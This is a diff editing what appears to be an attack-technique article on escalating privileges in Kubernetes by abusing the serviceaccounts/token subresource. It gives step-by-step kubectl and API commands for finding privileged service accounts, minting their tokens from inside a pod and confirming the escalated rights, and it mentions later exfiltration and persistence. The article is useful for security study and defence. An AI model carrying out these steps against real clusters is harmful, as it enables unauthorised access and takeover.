@@ -46,9 +46,9 @@ A caller sends a `TokenRequest` body specifying how long the token should live a
 
 The `spec` also accepts an optional `boundObjectRef` field that ties the resulting token to the lifetime of a specific pod or Secret. Without it the token is unbound: it remains valid until `exp` regardless of whether the requesting workload still exists.
 
-A caller with `create` on the `serviceaccounts/token` subresource can call this endpoint for any service account the RBAC rule covers, not just its own. The token is generated in memory and never written to etcd — no Secret object is created and the credential cannot be retrieved after the API response is returned. The API server has no requirement that the requester and the target be the same identity, which means any over-permissive grant of the subresource becomes an impersonation primitive.
+A caller with `create` on the `serviceaccounts/token` subresource can call this endpoint for any service account the RBAC rule covers, not just its own. The token is generated in memory and never written to etcd. No Secret object is created and the credential cannot be retrieved after the API response is returned. The API server has no requirement that the requester and the target be the same identity, which means any over-permissive grant of the subresource becomes an impersonation primitive.
 
-## Required permission
+## RBAC permissions
 
 The minimum RBAC rule that enables this technique is:
 
@@ -59,13 +59,13 @@ rules:
     verbs: ["create"]
 ```
 
-The attacker does not need `get` on `serviceaccounts`, `create` on `pods`, or access to `secrets`. This single rule is sufficient to request a token for any service account in the namespace unless `resourceNames` is used to restrict the scope.
+The attacker does not need `get` on `serviceaccounts`, `create` on `pods`, or access to `secrets`. This single rule is sufficient to request a token for any service account in the namespace. Scoping the rule with `resourceNames` limits which accounts can be targeted but does not prevent escalation. If any named account holds elevated privileges, the attacker can still acquire its token.
 
 ## The attack sequence
 
 ### Step 1: Verify the permission
 
-Before attempting the token request, confirm that the current identity holds the required permission. `kubectl auth can-i` submits a `SelfSubjectAccessReview` to the API server. The slash form (`serviceaccounts/token`) populates only the `resource` field of the review spec, leaving the `subresource` field empty. The API server evaluates the review with no subresource set, which does not match the actual RBAC rule. The `--subresource` flag is required to populate the correct field. The slash form returns a misleading `no`:
+`kubectl auth can-i` does not evaluate `resourceNames`-scoped rules. When the role restricts access to specific service accounts by name, both the slash form and the `--subresource` form return `no`, even though the permission is real and the token request will succeed.
 
 ```bash
 kubectl auth can-i create serviceaccounts/token -n <namespace>
@@ -75,35 +75,35 @@ kubectl auth can-i create serviceaccounts/token -n <namespace>
 no
 ```
 
-The correct check uses `--subresource`:
-
 ```bash
 kubectl auth can-i create serviceaccounts --subresource=token -n <namespace>
 ```
 
 ```output
-yes
+no
 ```
+
+Both return `no` because `SelfSubjectAccessReview` does not evaluate rules with `resourceNames`. The check is blind to scoped grants. The actual token request bypasses this check entirely and succeeds as long as the role covers the target account name.
 
 ### Step 2: Identify a privileged target
 
 Enumeration is not always necessary. Several service accounts exist by default in every Kubernetes cluster and are worth targeting directly without prior discovery.
 
-The `default` service account is present in every namespace. Operators who do not create dedicated service accounts for their workloads often bind roles directly to `default`, making it a reliable first target.
+The `default` service account is present in every namespace but carries no permissions by default. It becomes a target only when operators bind roles to it directly, which happens when workloads are deployed without a dedicated service account. Confirm a role is bound before treating it as useful.
 
 In `kube-system`, service accounts such as `replicaset-controller`, `deployment-controller`, and `horizontal-pod-autoscaler` are created by the cluster itself and hold broad permissions over their respective resources. These names are fixed across all standard Kubernetes installations and can be targeted without any prior enumeration.
 
-When service account names are not known in advance, list all candidates in the namespace:
+When service account names are not known in advance, list all accounts in the namespace:
 
 ```bash
 kubectl get serviceaccounts -n <namespace> -o name
 ```
 
-To identify which candidates hold useful permissions without access to RoleBindings, probe using impersonation:
+To identify which accounts hold useful permissions without access to RoleBindings, probe using impersonation:
 
 ```bash
 kubectl auth can-i --list -n <namespace> \
-  --as=system:serviceaccount:<namespace>:<candidate-sa>
+  --as=system:serviceaccount:<namespace>:<target-sa>
 ```
 
 ### Step 3: Request the token
@@ -120,7 +120,10 @@ rules:
     resources: ["replicasets"]
     verbs: ["get", "list", "update", "watch"]
   - apiGroups: ["apps", "extensions"]
-    resources: ["replicasets/status", "replicasets/finalizers"]
+    resources: ["replicasets/status"]
+    verbs: ["update"]
+  - apiGroups: ["apps", "extensions"]
+    resources: ["replicasets/finalizers"]
     verbs: ["update"]
   - apiGroups: [""]
     resources: ["pods"]
@@ -130,7 +133,7 @@ rules:
     verbs: ["create", "patch", "update"]
 ```
 
-An attacker whose workload runs in any namespace only needs a `Role` in `kube-system` granting `create` on `serviceaccounts/token` scoped to `replicaset-controller`:
+An attacker whose workload runs in any namespace only needs a `Role` in `kube-system` granting `create` on `serviceaccounts/token` for the target account. Scoping the role with `resourceNames` does not prevent escalation. It only controls which service accounts are in scope. If the named account holds elevated privileges, the outcome is identical to an unscoped grant:
 
 ```yaml
 apiVersion: rbac.authorization.k8s.io/v1
@@ -145,7 +148,7 @@ rules:
     resourceNames: ["replicaset-controller"]
 ```
 
-From inside a pod with this permission, use the auto-mounted credential to call the TokenRequest API directly. The `kubernetes.default.svc` DNS name may not resolve in all pod configurations — using the `KUBERNETES_SERVICE_HOST` and `KUBERNETES_SERVICE_PORT` environment variables is the reliable path:
+From inside a pod with this permission, use the auto-mounted credential to call the TokenRequest API directly. The `kubernetes.default.svc` DNS name may not resolve in all pod configurations. Use the `KUBERNETES_SERVICE_HOST` and `KUBERNETES_SERVICE_PORT` environment variables instead:
 
 ```bash
 APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
@@ -211,4 +214,14 @@ kubectl auth can-i create pods -n default \
 yes
 ```
 
-Once the escalated token is in hand, it can be exfiltrated and used to maintain access from outside the cluster without leaving any in-cluster footprint. That lifecycle — exfiltration, pod deletion, and external persistence — is covered in [Persistence via Unbound Service Account Tokens](/topics/persistence-via-unbound-serviceaccount-tokens).
+To verify using the actual escalated token rather than `--as` impersonation:
+
+```bash
+kubectl auth can-i create pods -n default --token="<escalated-token>"
+```
+
+```output
+yes
+```
+
+Once the escalated token is in hand, it can be exfiltrated and used to maintain access from outside the cluster without leaving any in-cluster footprint. That lifecycle (exfiltration, pod deletion, and external persistence) is covered in [Persistence via Unbound Service Account Tokens](/topics/persistence-via-unbound-serviceaccount-tokens).
